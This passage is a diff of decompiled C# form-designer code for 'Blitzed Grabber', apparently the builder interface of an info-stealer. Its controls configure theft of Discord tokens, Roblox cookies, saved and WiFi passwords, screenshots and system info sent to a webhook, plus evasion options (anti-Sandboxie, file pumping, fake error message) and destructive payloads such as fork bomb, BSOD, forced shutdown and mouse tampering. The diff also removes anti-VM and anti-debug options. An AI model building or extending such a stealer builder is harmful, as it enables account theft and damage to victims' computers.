-			this.discorduserappsuggestionstextbox.CustomButton.Size = new global::System.Drawing.Size(17, 17);
-			this.discorduserappsuggestionstextbox.CustomButton.Style = global::MetroFramework.MetroColorStyle.Blue;
-			this.discorduserappsuggestionstextbox.CustomButton.TabIndex = 1;
-			this.discorduserappsuggestionstextbox.CustomButton.Theme = global::MetroFramework.MetroThemeStyle.Light;
-			this.discorduserappsuggestionstextbox.CustomButton.UseSelectable = true;
-			this.discorduserappsuggestionstextbox.CustomButton.Visible = false;
-			this.discorduserappsuggestionstextbox.ForeColor = global::System.Drawing.Color.White;
-			this.discorduserappsuggestionstextbox.Lines = new string[0];
-			this.discorduserappsuggestionstextbox.Location = new global::System.Drawing.Point(20, 26);
-			this.discorduserappsuggestionstextbox.MaxLength = 32767;
-			this.discorduserappsuggestionstextbox.Name = "discorduserappsuggestionstextbox";
-			this.discorduserappsuggestionstextbox.PasswordChar = '\0';
-			this.discorduserappsuggestionstextbox.PromptText = "Discord Username";
-			this.discorduserappsuggestionstextbox.ScrollBars = global::System.Windows.Forms.ScrollBars.None;
-			this.discorduserappsuggestionstextbox.SelectedText = "";
-			this.discorduserappsuggestionstextbox.SelectionLength = 0;
-			this.discorduserappsuggestionstextbox.SelectionStart = 0;
-			this.discorduserappsuggestionstextbox.ShortcutsEnabled = true;
-			this.discorduserappsuggestionstextbox.Size = new global::System.Drawing.Size(649, 22);
-			this.discorduserappsuggestionstextbox.TabIndex = 40;
-			this.discorduserappsuggestionstextbox.Theme = global::MetroFramework.MetroThemeStyle.Dark;
-			this.discorduserappsuggestionstextbox.UseSelectable = true;
-			this.discorduserappsuggestionstextbox.WaterMark = "Discord Username";
-			this.discorduserappsuggestionstextbox.WaterMarkColor = global::System.Drawing.Color.FromArgb(109, 109, 109);
-			this.discorduserappsuggestionstextbox.WaterMarkFont = new global::System.Drawing.Font("Segoe UI", 12f, global::System.Drawing.FontStyle.Italic, global::System.Drawing.GraphicsUnit.Pixel);
 			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
 			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
 			base.ClientSize = new global::System.Drawing.Size(836, 444);
 			base.Controls.Add(this.metroTabControl2);
-			base.Icon = (global::System.Drawing.Icon)componentResourceManager.GetObject("$this.Icon");
+			base.Icon = (global::System.Drawing.Icon)resources.GetObject("$this.Icon");
 			base.Name = "Form1";
 			base.Style = global::MetroFramework.MetroColorStyle.Red;
 			this.Text = "Blitzed Grabber";
@@ -943,8 +904,6 @@
 			this.groupBox4.PerformLayout();
 			this.groupBox8.ResumeLayout(false);
 			this.groupBox8.PerformLayout();
-			this.groupBox9.ResumeLayout(false);
-			this.groupBox9.PerformLayout();
 			((global::System.ComponentModel.ISupportInitialize)this.iconPictureBox).EndInit();
 			this.optionsTab.ResumeLayout(false);
 			this.webhookGroupBox.ResumeLayout(false);
@@ -957,7 +916,6 @@
 			this.metroTabControl2.ResumeLayout(false);
 			this.settingsPage.ResumeLayout(false);
 			this.settingsPage.PerformLayout();
-			this.feedbackPage.ResumeLayout(false);
 			this.groupBox5.ResumeLayout(false);
 			base.ResumeLayout(false);
 		}
@@ -990,165 +948,162 @@
 		private global::System.Windows.Forms.GroupBox groupBox4;
 
 		// Token: 0x0400002D RID: 45
-		private global::MetroFramework.Controls.MetroPanel metroPanel1;
-
-		// Token: 0x0400002E RID: 46
-		private global::MetroFramework.Controls.MetroPanel comingSoonPanel2;
-
-		// Token: 0x0400002F RID: 47
 		public global::System.Windows.Forms.GroupBox groupBox8;
 
-		// Token: 0x04000030 RID: 48
+		// Token: 0x0400002E RID: 46
 		private global::MetroFramework.Controls.MetroCheckBox AntiSandboxiecheckbox;
 
-		// Token: 0x04000031 RID: 49
+		// Token: 0x0400002F RID: 47
 		private global::MetroFramework.Controls.MetroCheckBox HideInIdentityCheckbox;
 
-		// Token: 0x04000032 RID: 50
+		// Token: 0x04000030 RID: 48
 		private global::MetroFramework.Controls.MetroCheckBox RespawnCheckbox;
 
-		// Token: 0x04000033 RID: 51
-		public global::System.Windows.Forms.GroupBox groupBox9;
-
-		// Token: 0x04000034 RID: 52
-		private global::MetroFramework.Controls.MetroCheckBox AntiVMCheckbox;
-
-		// Token: 0x04000035 RID: 53
-		private global::MetroFramework.Controls.MetroCheckBox AntiDebugCheckBox;
-
-		// Token: 0x04000036 RID: 54
-		private global::MetroFramework.Controls.MetroCheckBox AntiProcessHackerCheckBox;
-
-		// Token: 0x04000037 RID: 55
-		private global::MetroFramework.Controls.MetroCheckBox AntiHTTPDebugCheckBox;
-
-		// Token: 0x04000038 RID: 56
+		// Token: 0x04000031 RID: 49
 		private global::MetroFramework.Controls.MetroCheckBox GigaByteCheckbox;
 
-		// Token: 0x04000039 RID: 57
+		// Token: 0x04000032 RID: 50
 		private global::MetroFramework.Controls.MetroButton chooseIconButton;
 
-		// Token: 0x0400003A RID: 58
+		// Token: 0x04000033 RID: 51
 		private global::MetroFramework.Controls.MetroTextBox errorTitleTextBox;
 
-		// Token: 0x0400003B RID: 59
+		// Token: 0x04000034 RID: 52
 		private global::System.Windows.Forms.PictureBox iconPictureBox;
 
-		// Token: 0x0400003C RID: 60
+		// Token: 0x04000035 RID: 53
 		private global::MetroFramework.Controls.MetroTextBox errorMessageTextBox;
 
-		// Token: 0x0400003D RID: 61
+		// Token: 0x04000036 RID: 54
 		private global::MetroFramework.Controls.MetroCheckBox iconCheckBox;
 
-		// Token: 0x0400003E RID: 62
+		// Token: 0x04000037 RID: 55
 		private global::MetroFramework.Controls.MetroCheckBox fakeErrorCheckBox;
 
-		// Token: 0x0400003F RID: 63
+		// Token: 0x04000038 RID: 56
 		private global::MetroFramework.Controls.MetroTextBox iconPathTextBox;
 
-		// Token: 0x04000040 RID: 64
+		// Token: 0x04000039 RID: 57
 		private global::MetroFramework.Controls.MetroTextBox pumpAmountTextBox;
 
-		// Token: 0x04000041 RID: 65
+		// Token: 0x0400003A RID: 58
 		private global::MetroFramework.Controls.MetroCheckBox kiloByteCheckBox;
 
-		// Token: 0x04000042 RID: 66
+		// Token: 0x0400003B RID: 59
 		private global::MetroFramework.Controls.MetroCheckBox filePumperCheckBox;
 
-		// Token: 0x04000043 RID: 67
+		// Token: 0x0400003C RID: 60
 		private global::MetroFramework.Controls.MetroCheckBox megaByteCheckBox;
 
-		// Token: 0x04000044 RID: 68
+		// Token: 0x0400003D RID: 61
 		private global::MetroFramework.Controls.MetroTabPage optionsTab;
 
-		// Token: 0x04000045 RID: 69
+		// Token: 0x0400003E RID: 62
 		private global::System.Windows.Forms.GroupBox webhookGroupBox;
 
-		// Token: 0x04000046 RID: 70
+		// Token: 0x0400003F RID: 63
 		private global::MetroFramework.Controls.MetroButton testWebhookButton;
 
-		// Token: 0x04000047 RID: 71
+		// Token: 0x04000040 RID: 64
 		private global::MetroFramework.Controls.MetroTextBox webhookTextBox;
 
-		// Token: 0x04000048 RID: 72
-		private global::System.Windows.Forms.GroupBox groupBox3;
+		// Token: 0x04000041 RID: 65
+		private global::MetroFramework.Controls.MetroCheckBox DebugModeCheckBox;
 
-		// Token: 0x04000049 RID: 73
-		private global::MetroFramework.Controls.MetroCheckBox DebugModeOn;
-
-		// Token: 0x0400004A RID: 74
+		// Token: 0x04000042 RID: 66
 		private global::MetroFramework.Controls.MetroCheckBox metroCheckBox7;
 
-		// Token: 0x0400004B RID: 75
+		// Token: 0x04000043 RID: 67
 		private global::MetroFramework.Controls.MetroCheckBox CrashDiscordCheckBox;
 
-		// Token: 0x0400004C RID: 76
-		private global::System.Windows.Forms.GroupBox groupBox2;
-
-		// Token: 0x0400004D RID: 77
+		// Token: 0x04000044 RID: 68
 		private global::MetroFramework.Controls.MetroCheckBox ForkBombCheckBox;
 
-		// Token: 0x0400004E RID: 78
+		// Token: 0x04000045 RID: 69
 		private global::MetroFramework.Controls.MetroCheckBox restartpccheckbox;
 
-		// Token: 0x0400004F RID: 79
+		// Token: 0x04000046 RID: 70
 		private global::MetroFramework.Controls.MetroCheckBox shutdownpccheckbox;
 
-		// Token: 0x04000050 RID: 80
+		// Token: 0x04000047 RID: 71
 		private global::MetroFramework.Controls.MetroCheckBox bsodcheckbox;
 
-		// Token: 0x04000051 RID: 81
-		private global::System.Windows.Forms.GroupBox groupBox1;
-
-		// Token: 0x04000052 RID: 82
+		// Token: 0x04000048 RID: 72
 		private global::MetroFramework.Controls.MetroCheckBox MinecraftCheckBox;
 
-		// Token: 0x04000053 RID: 83
+		// Token: 0x04000049 RID: 73
 		private global::MetroFramework.Controls.MetroCheckBox PCScreenShotCheckbox;
 
-		// Token: 0x04000054 RID: 84
+		// Token: 0x0400004A RID: 74
 		private global::MetroFramework.Controls.MetroCheckBox tokensCheckBox;
 
-		// Token: 0x04000055 RID: 85
+		// Token: 0x0400004B RID: 75
 		private global::MetroFramework.Controls.MetroCheckBox rbxcookiecheckbox;
 
-		// Token: 0x04000056 RID: 86
+		// Token: 0x0400004C RID: 76
 		private global::MetroFramework.Controls.MetroCheckBox passwordcheckbox;
 
-		// Token: 0x04000057 RID: 87
+		// Token: 0x0400004D RID: 77
 		private global::MetroFramework.Controls.MetroCheckBox pcinfocheckbox;
 
-		// Token: 0x04000058 RID: 88
+		// Token: 0x0400004E RID: 78
 		private global::MetroFramework.Controls.MetroTabControl metroTabControl2;
 
-		// Token: 0x04000059 RID: 89
+		// Token: 0x0400004F RID: 79
 		private global::MetroFramework.Controls.MetroTabPage settingsPage;
 
-		// Token: 0x0400005A RID: 90
+		// Token: 0x04000050 RID: 80
 		private global::MetroFramework.Controls.MetroCheckBox TopMostCheckBox;
 
-		// Token: 0x0400005B RID: 91
+		// Token: 0x04000051 RID: 81
 		private global::MetroFramework.Controls.MetroCheckBox metroCheckBox6;
 
-		// Token: 0x0400005C RID: 92
+		// Token: 0x04000052 RID: 82
+		private global::MetroFramework.Controls.MetroPanel metroPanel2;
+
+		// Token: 0x04000053 RID: 83
+		private global::MetroFramework.Controls.MetroTextBox FreezeMouseSeconds;
+
+		// Token: 0x04000054 RID: 84
+		private global::MetroFramework.Controls.MetroCheckBox FreezeMouseCheckBox;
+
+		// Token: 0x04000055 RID: 85
+		private global::System.Windows.Forms.GroupBox groupBox3;
+
+		// Token: 0x04000056 RID: 86
+		private global::System.Windows.Forms.GroupBox groupBox2;
+
+		// Token: 0x04000057 RID: 87
+		private global::System.Windows.Forms.GroupBox groupBox1;
+
+		// Token: 0x04000058 RID: 88
 		private global::MetroFramework.Controls.MetroCheckBox WIFIPasswordsCheckBox;
 
-		// Token: 0x0400005D RID: 93
-		private global::MetroFramework.Controls.MetroTabPage feedbackPage;
+		// Token: 0x04000059 RID: 89
+		private global::MetroFramework.Controls.MetroCheckBox SwapMouseCheckBox;
 
-		// Token: 0x0400005E RID: 94
+		// Token: 0x0400005A RID: 90
 		private global::System.Windows.Forms.GroupBox groupBox5;
 
+		// Token: 0x0400005B RID: 91
+		private global::MetroFramework.Controls.MetroButton RecoverMouseButtons;
+
+		// Token: 0x0400005C RID: 92
+		private global::MetroFramework.Controls.MetroLabel ChangeLogLabel;
+
+		// Token: 0x0400005D RID: 93
+		private global::System.Windows.Forms.TextBox textBox1;
+
+		// Token: 0x0400005E RID: 94
+		private global::MetroFramework.Controls.MetroButton JoinDiscordButton;
+
 		// Token: 0x0400005F RID: 95
-		private global::MetroFramework.Controls.MetroButton metroButton1;
+		private global::MetroFramework.Controls.MetroButton OpenGithubButton;
 
 		// Token: 0x04000060 RID: 96
-		public global::MetroFramework.Controls.MetroTextBox discorduserappsuggestionstextbox;
+		private global::MetroFramework.Controls.MetroButton JoinTelegramButton;
 
 		// Token: 0x04000061 RID: 97
-		public global::MetroFramework.Controls.MetroTextBox appsuggestionstextbox;
-
-		// Token: 0x04000062 RID: 98
-		private global::MetroFramework.Controls.MetroPanel metroPanel2;
+		private global::MetroFramework.Controls.MetroButton metroButton1;
 	}
 }
